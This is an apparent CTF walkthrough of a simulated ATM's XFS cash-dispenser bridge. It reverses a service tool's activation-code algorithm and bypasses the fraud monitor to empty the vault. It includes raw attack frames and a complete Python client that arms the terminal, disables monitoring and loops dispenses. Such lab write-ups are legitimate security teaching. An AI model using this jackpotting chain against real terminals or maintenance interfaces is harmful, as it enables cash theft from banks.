---
layout: post
title: "Earth's National Bank ATM — Full XFS Cash Dispenser Walkthrough"
date: 2026-10-20
categories: [ctf, atm, xfs, reverse-engineering]
tags: [ctf, atm, xfs, reverse-engineering, protocol-analysis, elf, python]
---

**Target:** `10.49.144.95` (Earth's National Bank — Terminal 004)
**Type:** Networked ATM / CEN-XFS cash-dispenser bridge + engineering console
**Outcome:** Vault emptied (280 notes / $9,600), flag recovered, independently re-verified
**Date:** 2026-10-20

---

## 0. TL;DR

| Item | Value |
| --- | --- |
| **Flag** | `THM{n0_card_……………….._XFS}` |
| **Exposed services** | `22` SSH (key-only), `8080` engineering console, `9100` XFS CDM bridge |
| **The "supervisor" gate** | Activation code = `FNV-1a-64(nonce)` → 6 rounds over `"ENBANK"` → `mod 10^8` |
| **Why it fell** | The nonce is broadcast by the same unauth service, so the code is computable by anyone |
| **The real obstacle** | A fraud monitor enforcing one dispense per ARM, with a full vault rollback on violation |
| **The bypass** | `0x4f1 SET_MONITOR <0>` while armed — same unauthenticated channel |
| **Drain** | 7 × `DISPENSE 0` (max = 40 notes, highest-denomination-first) = 280 notes / $9,600 |
| **Verification** | Independent live re-read reproduced the flag frame byte-for-byte; 121/121 manifest hashes OK |

---

## 1. Scope & Authorization

This is a **purpose-built CTF target** — a simulated ATM exposing a maintenance interface that was
"only ever meant for engineers on the branch LAN". The scope was one host, `10.49.144.95`, and the
objective was to make the cash dispenser empty every cassette and return the flag.

Ground rules I set for myself:

- One target only. Nothing else on the network was touched.
- No public writeups, no flag databases, no searching for the answer. Everything below was derived
  from the target's own bytes. (Vendor protocol vocabulary — CEN/XFS command naming — was the only
  outside concept used, and only to read names like `WFS_CMD_CDM_DISPENSE`.)
- Mutations were deliberate and counted. The machine moves cash; a careless call is irreversible in
  a way a normal web request is not.
- Every claim in this post is backed by a raw frame saved during the engagement, including the three
  failed drain attempts.

That last point matters more than usual here, because the interesting part of this box is not the
initial access — it's the control that keeps slapping you back.

---

## 2. Target Triage

### 2.1 Ports and services

```bash
nmap -Pn -p- --min-rate 2000 -T4 -oA full_tcp 10.49.144.95
nmap -Pn -sV -sC -p22,8080,9100 --version-all -oA sv_sc 10.49.144.95
```

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http      BaseHTTP/0.6 Python/3.12.3
9100/tcp open  jetdirect?
```

Two of those three deserve comment.

- **`9100` is not JetDirect.** Nmap labels it that way because of the port convention. It is actually
  a custom binary protocol that identifies itself in its first bytes.
- **`8080` is a hand-rolled Python app.** `BaseHTTP/0.6` plus `Python/3.12.3` means
  `http.server.BaseHTTPRequestHandler`, not Flask/Django. Custom handlers usually mean custom
  routing bugs — remember that.

SSH is publickey-only, and no credential material was ever found. It turned out to be irrelevant.

### 2.2 The engineering console (8080)

```bash
curl -si http://10.49.144.95:8080/
```

```html
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.12.3
Content-Type: text/html

<title>Earth's National Bank — Terminal 004 Engineering Console</title>
...
<div class="subbar">Remote engineering gateway — bridges authorized branch-LAN requests
to the terminal's local XFS service provider.</div>
```

The page renders live terminal state and polls `GET /status` every 700 ms. It also offers one
download:

```html
<a class="btn" href="/jackpot" download>Download service tool — jackpot</a>
```

And one piece of prose that ends up being the whole challenge:

> "Field technicians: the terminal service tool derives a supervisor activation code from the
> session code shown above. Download and run it on the code currently displayed on screen."

> **Gotcha #1 — the handler is a catch-all.** `GET /nope-control-xyz` also returns `200` with the
> byte-identical console page. Status codes are useless for discovery here; the only reliable signal
> is a body hash that differs from `/`. I burned one request proving this before trusting any path
> finding.

### 2.3 The 9100 banner

```bash
nc -nv 10.49.144.95 9100
```

```
{"service": "Branch Engineering Gateway",
 "protocol": "XFS bridge",
 "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
 "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)",
 "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
 "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}
```

The service hands you its own protocol documentation on connect. It is also honest about the framing:
the banner arrives **unprompted**, before you send anything.

> **Gotcha #2 — read the banner frame first.** My first probe sent `GETINFO 0x0304` immediately and
> got back… the banner. The reply was 453 bytes and hashed identical to the banner file. If you don't
> consume the banner, your first reply is always the banner, and you will mis-read it as a response.
> The frame is self-describing: `0x01C5` = 453 bytes.

### 2.4 Capabilities

With the banner consumed, `GETINFO 0x0304` returns the real command table:

```
0x301  WFS_INF_CDM_STATUS           read
0x303  WFS_INF_CDM_CASH_UNIT_INFO   read
0x304  WFS_INF_CDM_CAPABILITIES     read
0x401  WFS_CMD_CDM_DISPENSE         execute   <-- the point of the exercise
0x4f0  WFS_CMD_CDM_ARM              execute   <-- supervisor mode
0x4f1  WFS_CMD_CDM_SET_MONITOR      execute   <-- fraud monitor
0x4ff  WFS_CMD_CDM_GET_FLAG         read      <-- the reward
max_dispense: 40
```

Every name is standard CEN/XFS vocabulary. The implementation is bespoke, but the naming tells you
what each command is *supposed* to do — which is enough to plan.

### 2.5 Status, for free

```
01 00000301 0000        # GETINFO 0x301
```

```json
{"rc": "WFS_SUCCESS",
 "status": {"nonce": "090665", "armed": false, "monitor_on": true,
            "locked": false, "lock_remaining": 0, "screen": "INSERT CARD",
            "dispensed_total": 0, "remaining_notes": 280, "vault_total_notes": 280,
            "cassettes": [{"id": "CST1", "denom": 10,  "count": 100},
                          {"id": "CST2", "denom": 20,  "count": 80},
                          {"id": "CST3", "denom": 50,  "count": 60},
                          {"id": "CST4", "denom": 100, "count": 40}],
            "flag_released": false}}
```

No authentication, no session, no token. The machine tells an anonymous client the session nonce and
exactly how much money is inside it. That combination — a disclosed secret and a visible target — is
the shape of the whole exploit.

---

## 3. Attack Chain Overview

```
 ┌────────────────────────────────────────────────────────────────────────┐
 │ 1. RECON    22 ssh / 8080 console / 9100 XFS bridge                    │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 2. PROTOCOL banner -> framing -> 7-command table -> status             │
 │             nonce + cassette inventory, unauthenticated                │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 3. TOOL     GET /jackpot -> 14 KB ELF -> reverse the code derivation   │
 │             activation = f(nonce)   (public input, no secret)          │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 4. ARM      0x4f0 accepts RAW ASCII code -> armed=true                 │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 5. WALL     0x401 dispenses once; second call -> LOCK + FULL ROLLBACK  │
 │             (reproduced 3x; re-ARM while armed is a silent no-op)      │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 6. BYPASS   0x4f1 SET_MONITOR 0 (arm-gated) -> monitor_on=false        │
 │             transaction gate removed                                   │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 7. DRAIN    7 x 0x401 "0" -> 40 notes each -> 280 notes / $9,600       │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 8. FLAG     0x4ff GET_FLAG -> THM{...}                                 │
 └────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Phase 1 — A Minimal Client

Before touching anything stateful, build a client that speaks the framing exactly. The frame is
7 bytes of header, then data:

```
request : msg_type(1) | command_id(4, big-endian) | length(2, big-endian) | data
reply   : length(2, big-endian) | JSON
```

```python
import socket, struct, json

HOST, PORT = "10.49.144.95", 9100
MSG_GETINFO, MSG_EXECUTE = 0x01, 0x02

def read_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError(f"peer closed after {len(buf)}/{n} bytes")
        buf += chunk
    return buf

def recv_frame(sock):
    n = struct.unpack(">H", read_exact(sock, 2))[0]
    return json.loads(read_exact(sock, n))

def send(sock, msg_type, cmd, data=b""):
    sock.sendall(struct.pack(">BIH", msg_type, cmd, len(data)) + data)

def connect():
    s = socket.create_connection((HOST, PORT), timeout=10)
    banner = recv_frame(s)          # MUST consume the banner first
    return s, banner
```

```python
s, banner = connect()
send(s, MSG_GETINFO, 0x0301)
print(json.dumps(recv_frame(s), indent=2))
```

Two protocol facts worth writing down early:

- **The reader blocks on an exact length.** Send a truncated header or claim `0xFFFF` bytes and the
  server simply never replies — no error, no timeout, just silence. Framing is enforced by a blocking
  read, not by validation.
- **Connections are concurrent.** Holding one socket open with a bogus length does not wedge the
  service; a second connection gets served normally. (This falsified my first guess that the bridge
  serialised clients.)

### 4.1 `msg_type` is decorative

The banner advertises `GETINFO: 0x01` and `EXECUTE: 0x02`, which implies a read/write separation.
It isn't real:

```
00 00000301 0000   ->  full 432-byte status, WFS_SUCCESS
03 00000301 0000   ->  full 432-byte status, WFS_SUCCESS
01 00000301 0000   ->  full 432-byte status, WFS_SUCCESS
```

`0x00` and `0x03` are neither rejected nor noted. **Dispatch is by command id alone.** That is a
useful architectural fact — any hypothetical front-end that filtered on the type byte could be
bypassed with one byte — but in the end every frame in the winning chain used `0x02`, so this was a
true-but-irrelevant observation. Good to know, not the exploit.

### 4.2 What the read commands will not tell you

`0x303` (cash unit info) looked promising for learning the DISPENSE argument shape. It is a strict
subset of `0x301`:

```json
{"rc": "WFS_SUCCESS",
 "cassettes": [...], "remaining_notes": 280}
```

No unit index, no type, no per-cassette status — and **no request schema for any EXECUTE command**.
`0x304` is equally silent. Unknown command ids (`0x300`, `0x302`, `0x305`, `0x306`) all return
`WFS_ERR_UNSUPP_COMMAND`, so the command space is exactly the seven published ids.

Conclusion: the payload format has to come from somewhere else. It came from a 14 KB ELF.

---

## 5. Phase 2 — The Service Tool

### 5.1 Triage

```bash
curl -s http://10.49.144.95:8080/jackpot -o jackpot
file jackpot
sha256sum jackpot
```

```
jackpot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
         dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
         BuildID[sha1]=2e9a3772..., for GNU/Linux 3.2.0, stripped

0980b26d08683e96ffbe167fbbf878a098d20d7226b2dcdcd51a35de8a7365c6
```

14,472 bytes. `.text` is **473 bytes**. It imports exactly `strlen`, `printf`, `fprintf`,
`__libc_start_main` — no `socket`, no `connect`, no `send`. Whatever this thing does, it does not
talk to the ATM. It is a calculator.

### 5.2 The algorithm

Disassembly of `main` (at `0x10a0`) is small enough to read end to end. The constants give it away:

| Constant | Address | Meaning |
| --- | --- | --- |
| `0xcbf29ce484222325` | `0x1107` | FNV-1a-64 offset basis |
| `0x100000001b3` | `0x1118`, `0x1146` | FNV-1a-64 prime |
| `"ENBANK"` | `.rodata 0x2004` | domain separator |
| `29` | `0x115e` | xorshift right distance |
| `0x5f5e100` | `0x116c` | 100,000,000 (modulus) |

Reconstructed:

```python
PRIME = 0x100000001B3
MASK  = 0xFFFFFFFFFFFFFFFF

def activation(code: str) -> str:
    if len(code) != 6:                       # the binary checks strlen only
        raise ValueError("session code must be exactly 6 bytes")

    x = 0xCBF29CE484222325
    for b in code.encode():                  # FNV-1a-64
        x = ((x ^ b) * PRIME) & MASK

    for b in b"ENBANK":                      # 6-round fold
        t = ((b ^ x) * PRIME) & MASK
        x = (t ^ (t >> 29)) & MASK

    return f"{x % 100_000_000:08d}"          # always 8 digits
```

Verification against the real binary, eight vectors:

| Session code | Binary output | Reimplementation |
| --- | --- | --- |
| `090665` | 21067483 | 21067483 |
| `123456` | 47384178 | 47384178 |
| `000000` | 14223351 | 14223351 |
| `ABCDEF` | 12184684 | 12184684 |
| `ENBANK` | 93255890 | 93255890 |
| `999999` | 13905705 | 13905705 |
| `1a2b3c` | 10902185 | 10902185 |
| `!@#$%^` | 78552325 | 78552325 |

Two design flaws are visible in the algorithm itself, before touching the network:

1. **The "secret" is a pure function of a public, 6-digit, non-rotating value.** The input space is
   10⁶ — every valid code is enumerable offline in seconds. There is no key, salt, timestamp or
   randomness anywhere in the routine.
2. **Validation is length-only and digit-agnostic.** `ABCDEF` and `!@#$%^` are accepted by the tool.
   It is a formatter, not a validator.

The tool also contains **no ARM or DISPENSE payload builder** — no JSON templates, no command ids, no
ports. It only prints `[*] activation code: %08u`. That absence is itself the finding: the wire format
lives in the bridge, and must be learned from the bridge.

---

## 6. Phase 3 — Arming the Terminal

### 6.1 The obvious attempt: JSON

ARM is "supervisor activation". Every other payload on this service is JSON, so the first attempts
were JSON. All four failed with a byte-identical error:

```
{"rc": "WFS_ERR_CDM_INVALIDCODE", "detail": "invalid activation code"}
```

| Attempt | Body |
| --- | --- |
| 1 | `{"zzz":1}` |
| 2 | `{"activation":"21067483"}` |
| 3 | `{"activation_code":"21067483"}` |
| 4 | `{"activation_code":21067483}` |

Attempt 1 is the important one: a nonsense key returned the *same* error as a well-formed one. The
handler does not validate field names — it reads what it can, finds nothing, and emits a generic
error. **The error is deliberately non-discriminating**, so it cannot be used to enumerate the schema.

> **Dead end worth recording:** five ARM failures, zero lockout, zero state change. `locked` and
> `lock_remaining` turned out not to be an ARM failure counter at all — they are the fraud-monitor
> lock, which is a different mechanism entirely.

### 6.2 The breakthrough: raw ASCII

If the handler never parses JSON, the simplest implementation is a direct byte comparison:

```python
if payload == expected_code:   # bytes
    ...
```

Which makes the body the **code itself**, with no quotes, no braces:

```
02 000004f0 0008 3231303637343833
                  └─ "21067483" plain ASCII
```

```
{"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}
```

The difference between failure and success was exactly two bytes:

```
22 32 31 30 36 37 34 38 33 22    -> INVALIDCODE     (JSON string: "21067483")
   32 31 30 36 37 34 38 33       -> WFS_SUCCESS     (raw ASCII:  21067483)
```

State after arming:

```
armed=true   screen="SUPERVISOR MODE"   locked=false   remaining_notes=280
```

No identity, no session, no challenge. Anyone who can reach `9100` can read the nonce from the same
service, compute the code with a 20-line script, and put the machine into supervisor mode.

> **Lesson:** when an error is identical across obviously different malformed inputs, stop guessing
> field names. The parser probably isn't looking at fields at all.

---

## 7. Phase 4 — The Fraud Monitor Strikes Back

### 7.1 Dispense works — once

The DISPENSE body follows the same convention: raw ASCII integer.

```
02 00000401 0001 30        # body "0"
```

```json
{"rc": "WFS_SUCCESS", "notes": 40, "value": 4000, "remaining_notes": 240}
```

`0` means "maximum", and `max_dispense` is 40. Forty notes came out, highest denomination first:
CST4 (`$100` × 40) → `$4,000`. Remaining `240`. Everything reconciles.

### 7.2 The second call

Byte-identical request. Totally different result:

```json
{"rc": "WFS_ERR_CDM_LOCKED",
 "detail": "anomalous dispense with null transaction id -> machine locked",
 "lock_seconds": 45}
```

No cash moved. Then the interesting part.

### 7.3 The lock is a rollback, not a cooldown

Forty-five seconds later the terminal did not resume where it left off:

| | before call 2 | during lock | after 45 s |
| --- | --- | --- | --- |
| `nonce` | `090665` | `090665` | **`959035`** |
| `armed` | true | true | **false** |
| `locked` | false | **true** | false |
| `dispensed_total` | 40 | 40 | **0** |
| `remaining_notes` | 240 | 240 | **280** |
| CST4 | 0 | 0 | **40** |
| `screen` | `DISPENSING 40 NOTES` | `OUT OF SERVICE` | `INSERT CARD` |

The dispense was **undone**, the vault was refilled, and the nonce rotated — invalidating the
activation code you just spent time deriving.

I reproduced this three separate times. It is deterministic, which is a gift: a deterministic wall is
a wall you can characterise.

### 7.4 But why did call 2 fail?

Two hypotheses fit the first failure:

- **H1:** partial amounts need a transaction id (`"10"` was also refused).
- **H2:** only one dispense is allowed per ARM.

The first experiment was contaminated — call 2 was both "second dispense" *and* different from call 1
in a second way. So I ran the clean version: re-arm, then send **two byte-identical max dispensers**.

Both cycles sent identical ARM bytes and got identical ARM replies:

```
ARM      -> {"rc":"WFS_SUCCESS","detail":"armed - supervisor mode"}
DISPENSE -> {"rc":"WFS_SUCCESS","notes":40,...}          # works
ARM      -> {"rc":"WFS_SUCCESS","detail":"armed - supervisor mode"}   # same bytes
DISPENSE -> {"rc":"WFS_ERR_CDM_LOCKED","detail":"anomalous dispense with null transaction id ..."}
```

**ARM while already armed returns `WFS_SUCCESS` but is a silent no-op.** A false-positive success
signal — the ARM reply is identical whether it opened a transaction or did nothing. Only the next
DISPENSE reveals the truth.

So the model is:

> ARM opens **one** transaction. DISPENSE consumes it. A DISPENSE with no open transaction is
> "anomalous" and trips the fraud monitor, which locks the terminal and rolls the vault back.

And `armed` stays `true` the whole time, which is why re-arming looks like it should work and doesn't.

| Attempt | Strategy | Result |
| --- | --- | --- |
| 1 | arm → dispense `0`, dispense `0` | 40 notes, then **lock + rollback** |
| 2 | arm → 7 × dispense `0` | 40 notes, then **lock + rollback** |
| 3 | arm → dispense `0`, dispense `10` | 40 notes, then **lock + rollback** |
| 4 | arm → arm → dispense `0` | 40 notes, then **lock + rollback** |

Four strategies, four rollbacks, `$0` net. The box is deliberately built so that brute repetition
cannot win — every failed attempt resets you to 280 notes and a new nonce.

---

## 8. Phase 5 — Turning the Monitor Off

There was exactly one command in the seven-entry table never exercised: `0x4f1 SET_MONITOR`. And the
error message names the thing that keeps interfering: *fraud monitor*.

### 8.1 It is arm-gated

First attempt, sent while disarmed, with three different bodies:

```
02 000004f1 0001 30        -> {"rc": "WFS_ERR_CDM_NOTARMED"}
02 000004f1 0001 31        -> {"rc": "WFS_ERR_CDM_NOTARMED"}
02 000004f1 0005 66616c7365 -> {"rc": "WFS_ERR_CDM_NOTARMED"}
```

Identical across bodies → the rejection is **state-based**, not content-based. That single observation
gives you the correct ordering: **ARM first, then SET_MONITOR**.

### 8.2 The toggle

```
02 000004f0 0008 3039323233313437      # ARM "09223147"
   -> {"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}

02 000004f1 0001 30                    # SET_MONITOR body "0"
   -> {"rc": "WFS_SUCCESS", "monitor_on": false}
```

`0x301` confirms `monitor_on:false`, `armed:true`.

### 8.3 The decisive frame

Send the dispenser that had failed three times before, byte-identical, twice:

```
02 00000401 0001 30   -> {"rc":"WFS_SUCCESS","notes":40,"value":4000,"remaining_notes":240}
02 00000401 0001 30   -> {"rc":"WFS_SUCCESS","notes":40,"value":2000,"remaining_notes":200}
```

The second call succeeded.

**That is the whole box.** The control that enforced one-dispense-per-transaction is switchable off
through the same unauthenticated channel that dispenses the cash. There is no second gate behind it,
no re-arm needed, no transaction id required.

> **Why the monitor-off result is causal and not coincidence:** the only changed variable between the
> failing and succeeding second dispense is `monitor_on`. Same command, same bytes, same armed state,
> same nonce. Three prior failures with the monitor on; immediate success with it off.

---

## 9. Phase 6 — Draining the Vault

With the monitor off, drain in max dispensers. Seven calls, 40 notes each:

```python
while True:
    st = status(s)
    if st["remaining_notes"] == 0:
        break
    send(s, MSG_EXECUTE, 0x0401, b"0")     # "0" == max == 40 notes
    print(recv_frame(s))
```

| # | Reply | Dispensed | Remaining | Cassettes after |
| --- | --- | ---: | ---: | --- |
| 1 | `{"notes":40,"value":4000}` | 40 | 240 | CST4 40→0 |
| 2 | `{"notes":40,"value":2000}` | 80 | 200 | CST3 60→20 |
| 3 | `{"notes":40,"value":1400}` | 120 | 160 | CST3 20→0, CST2 80→60 |
| 4 | `{"notes":40,"value":800}` | 160 | 120 | CST2 60→20 |
| 5 | `{"notes":40,"value":600}` | 200 | 80 | CST2 20→0, CST1 100→80 |
| 6 | `{"notes":40,"value":400}` | 240 | 40 | CST1 80→40 |
| 7 | `{"notes":40,"value":400}` | 280 | **0** | CST1 40→0 |

`4000 + 2000 + 1400 + 800 + 600 + 400 + 400 = $9,600`, which is exactly
`100×$10 + 80×$20 + 60×$50 + 40×$100`. Every per-frame cassette delta sums to the notes dispensed.
Dispensing is strictly highest-denomination-first, so the order is deterministic.

The seventh reply announces the state change:

```json
{"rc": "WFS_SUCCESS", "notes": 40, "value": 400, "remaining_notes": 0,
 "detail": "vault empty - cashout proven; GET_FLAG now available"}
```

`0x301` now reports:

```json
{"flag_released": true, "screen": "VAULT EMPTY", "dispensed_total": 280,
 "remaining_notes": 0}
```

And GET_FLAG:

```
01 000004ff 0000
```

```
0056 7b227263223a20225746535f53554343455353222c2022666c6167223a202254484d7b6e305f...
```

```json
{"rc": "WFS_SUCCESS", "flag": "THM{n0_card_……………….._XFS}"}
```

The frame is 88 bytes: `0x0056` (=86) declared length, 86 bytes of payload, nothing trailing.

---

## 10. Phase 7 — Verification

A flag string in a terminal is not evidence. Three checks were run.

### 10.1 Independent re-read

A second pass opened fresh connections and re-sent only the two read commands (`0x301`, `0x4ff`) —
no ARM, no dispense:

```
stored : f7bf96a73db680c018108afb3b697233b07a9426dd8a690a3fa734517072f203
live   : f7bf96a73db680c018108afb3b697233b07a9426dd8a690a3fa734517072f203   (cmp: identical)
```

Six reads across four connections — including GET_FLAG as the *first* command on a fresh connection,
to prove it isn't relying on state built up by the drain — returned the same 88 bytes. The flag is
durable, not a one-shot fluke.

### 10.2 Pre-drain negative control

Every earlier `0x4ff` in the engagement returned an error:

```json
{"rc": "WFS_ERR_CDM_CASHUNITERROR", "detail": "no proof of cashout on record"}
```

and during a lock:

```json
{"rc": "WFS_ERR_CDM_LOCKED", "detail": "machine locked by fraud monitor", "lock_remaining": 44}
```

So the flag is genuinely gated on the cashout, not always-available. The ordering is evidenced
frame-by-frame: first `remaining_notes == 0`, immediately followed by the successful GET_FLAG.

### 10.3 Channel discrimination

`grep -rn "THM{"` across the whole evidence tree matches only the TASK-011 artifacts. The flag is in
**no** other channel:

| Channel | Carries the flag? |
| --- | --- |
| `0x4ff` GET_FLAG | **yes** |
| `0x301` status | no — only `flag_released:true` |
| `8080 /status` | no — released state, no flag value |
| `8080 /` console | no — static text "Flag released to operator" |

That last one is a nice detail: the console literally tells the operator a flag was released, but
never displays it. Only the hardware protocol does.

### 10.4 Review corrections

An independent review of the write-up chain narrowed three statements, which are reflected above:

- "No authentication anywhere" → **no identity/session/credential authentication**. A bearer code is
  still checked; the repeated `INVALIDCODE` replies prove something was compared.
- "One dispense per ARM" → one dispense per ARM-opened **transaction** while the monitor is enabled.
  `armed` remains true across the entire drain.
- "Nonce rotation invalidates the previous code" → inference only. A stale code was never actually
  submitted after a rotation.

One gap is worth stating plainly: GET_FLAG was never read with `0 < dispensed_total < 280`, because
the machine only reached those states while locked or already draining. "Vault empty is required"
rests on `flag_released=false` at earlier states plus the target's own announcement in the seventh
reply. It's the cheapest retest on a reset instance.

---

## 11. Complete Attack Chain (End-to-End)

A tester with only network access to `10.49.144.95` can reproduce everything:

1. **Scan.** `22`, `8080`, `9100`. Ignore nmap's `jetdirect?` label.
2. **Read the banner on 9100** and consume it before sending anything.
3. **`GETINFO 0x0304`** → command table; **`0x0301`** → nonce, cassettes, `max_dispense: 40`.
4. **Fetch `http://10.49.144.95:8080/jackpot`** → the service tool ELF.
5. **Reverse it** → `activation(nonce)` = FNV-1a-64 + `"ENBANK"` fold + `mod 10^8`.
6. **Compute the code** for the live nonce and send it to `0x4f0` **as raw ASCII**.
7. Observe that a second DISPENSE locks and rolls back; observe that re-ARM is a silent no-op.
8. **Send `0x4f1` body `0` while armed** → `monitor_on:false`.
9. **Dispense `0` seven times**, verifying cassette arithmetic every call.
10. **`0x4ff GET_FLAG`** → flag.

### Why the controls failed

| Control | Intent | Reality |
| --- | --- | --- |
| Network placement | Maintenance interface on branch LAN only | Reachable from the assessment network |
| "Supervisor" activation code | Require an engineer with the tool | Code is `f(nonce)`, and the nonce is broadcast by the same service |
| `msg_type` read/write split | Separate info from execute | Ignored; dispatch by command id |
| One dispense per ARM | Limit loss per supervisor session | Per *transaction*, and the gate is switchable off in-band |
| Fraud monitor | Detect anomalous dispensing | Disable command reachable unauthenticated, arm-gated only by the same forgeable code |
| Rollback on violation | Deter repeated attempts | Deterministic, so it just resets the attacker to a known state |

The deeper pattern: **every control on this machine is enforced by the same unauthenticated peer
that it is supposed to constrain.** The nonce that seeds the activation code, the switch that disables
the monitor, and the dispenser itself are all one `sendall()` apart.

---

## 12. Reproducibility

### 12.1 Toolchain

| Tool | Role |
| --- | --- |
| `nmap` 7.x | port/service discovery |
| `curl` | 8080 console and tool download |
| Python 3.12 | protocol client, algorithm reimplementation, drain loop |
| `objdump` / `readelf` / `gdb` | ELF reversing and syscall confirmation |
| `sha256sum` | evidence integrity |

No framework, no exploit tooling. The whole box is a socket and some arithmetic.

### 12.2 The four frames that matter

```
ARM         02 000004f0 0008 3231303637343833   # "21067483"
SET_MONITOR 02 000004f1 0001 30                 # "0"  (disable)
DISPENSE    02 00000401 0001 30                 # "0"  (max, 40 notes)
GET_FLAG    01 000004ff 0000
```

### 12.3 Full minimal client

```python
import socket, struct, json

HOST, PORT = "10.49.144.95", 9100
GETINFO, EXECUTE = 0x01, 0x02

PRIME = 0x100000001B3
MASK  = 0xFFFFFFFFFFFFFFFF

def activation(code):
    x = 0xCBF29CE484222325
    for b in code.encode():
        x = ((x ^ b) * PRIME) & MASK
    for b in b"ENBANK":
        t = ((b ^ x) * PRIME) & MASK
        x = (t ^ (t >> 29)) & MASK
    return f"{x % 100_000_000:08d}"

def read_exact(s, n):
    out = b""
    while len(out) < n:
        c = s.recv(n - len(out))
        if not c:
            raise EOFError
        out += c
    return out

def frame(s):
    n = struct.unpack(">H", read_exact(s, 2))[0]
    return json.loads(read_exact(s, n))

def send(s, t, cmd, data=b""):
    s.sendall(struct.pack(">BIH", t, cmd, len(data)) + data)

def status(s):
    send(s, GETINFO, 0x0301)
    return frame(s)["status"]

s = socket.create_connection((HOST, PORT), timeout=10)
frame(s)                                     # consume banner

nonce = status(s)["nonce"]
code  = activation(nonce).encode()
print("nonce", nonce, "code", code.decode())

send(s, EXECUTE, 0x04F0, code)               # ARM  (raw ASCII!)
print(frame(s))
send(s, EXECUTE, 0x04F1, b"0")               # monitor OFF
print(frame(s))

while status(s)["remaining_notes"] > 0:
    send(s, EXECUTE, 0x0401, b"0")           # max dispense
    print(frame(s))

send(s, GETINFO, 0x04FF)
print(frame(s))                              # the flag
```

### 12.4 Nonce rotation during the engagement

Because every failed drain rolled the machine back, the nonce changed and the code had to be
recomputed each time:

| Nonce | Activation code |
| --- | --- |
| `090665` | `21067483` |
| `959035` | `34188141` |
| `688524` | `61497803` |
| `429097` | `09223147` |

All four were accepted by ARM, which is a nice four-point confirmation that the recovered algorithm
is the algorithm the machine actually uses — not a coincidence on one sample.

---

## 13. Limitations & Lessons

**Limitations of this test**

- Single vantage point. Absence of a source-IP allowlist is likely but not provable from one address.
- Partial-amount DISPENSE semantics are untested: the only non-max attempt was refused by the
  transaction gate before amount handling, so it's unknown whether a valid partial path exists with
  the monitor off.
- `0x400` and `0x4f2` were deliberately left unsent — unclassified execute-range ids, and the objective
  was reached without them. They remain unexplored, not proven-absent.
- Exact build identity was never captured beyond service banners.
- The terminal was left in the post-exploit state (`armed=true`, `monitor_on=false`, vault empty).
  There is no DISARM or reset command in the table; only a lock/rollback restores baseline. Nothing
  was written to the target and no persistence was established.

**Lessons worth keeping**

1. **Read the banner first.** A self-describing protocol that pushes data on connect will silently
   answer your first request with that banner. Hash the frames; don't assume.
2. **When an error never changes, stop guessing fields.** Identical errors for `{"zzz":1}` and
   `{"activation_code":"..."}` meant the parser wasn't reading fields at all. The fix was removing
   JSON, not finding a better key name.
3. **Distinguish "success" from "did something".** ARM-while-armed returns `WFS_SUCCESS` and does
   nothing. The only way to tell was the *next* command. A 200 is not a state change.
4. **Characterise the wall before attacking it.** The fraud monitor was deterministic: lock, wait,
   full rollback, nonce rotation. Knowing that exactly made three failures cheap and made the
   monitor-off hypothesis obvious.
5. **Derive the control, then look for its switch.** Once the lock message named the fraud monitor,
   the one unexercised command in the table became the obvious target — and it was the bypass.
6. **A verifier must re-read, not re-quote.** The flag was confirmed by a fresh connection sending
   only read commands, byte-compared against the stored artifact, with the raw hashes published.

---

## 14. Appendix — Quick Reference

**Target:** `10.49.144.95` — `22/tcp` OpenSSH 9.6p1, `8080/tcp` Python engineering console, `9100/tcp` XFS CDM bridge

**Framing:** `msg_type(1) | cmd(4 BE) | len(2 BE) | data` → `len(2 BE) | JSON`

**Commands:** `0x301` status, `0x303` cash units, `0x304` capabilities, `0x401` dispense, `0x4f0` arm, `0x4f1` set monitor, `0x4ff` get flag

**Activation:** `FNV-1a-64(nonce)` → 6 rounds over `b"ENBANK"` (`t=(b^x)*P; x=t^(t>>29)`) → `mod 10^8`, printed 8 digits

**Wire formats:** ARM = raw ASCII code (`b"21067483"`); DISPENSE = raw ASCII integer notes (`b"0"` = max 40); SET_MONITOR = raw ASCII `b"0"` = off

**Vault:** CST1 `$10`×100, CST2 `$20`×80, CST3 `$50`×60, CST4 `$100`×40 = 280 notes / $9,600

**Drain:** 7 × 40 notes, highest-denomination-first: `4000, 2000, 1400, 800, 600, 400, 400`

**Flag artifact:** `0x4ff` reply, 88-byte frame (`0x0056` + 86 bytes), sha256 `f7bf96a73db680c018108afb3b697233b07a9426dd8a690a3fa734517072f203`

**Flag:** `THM{n0_card_……………….._XFS}`

**Tool artifact:** `jackpot` ELF64 PIE, 14,472 bytes, sha256 `0980b26d08683e96ffbe167fbbf878a098d20d7226b2dcdcd51a35de8a7365c6`
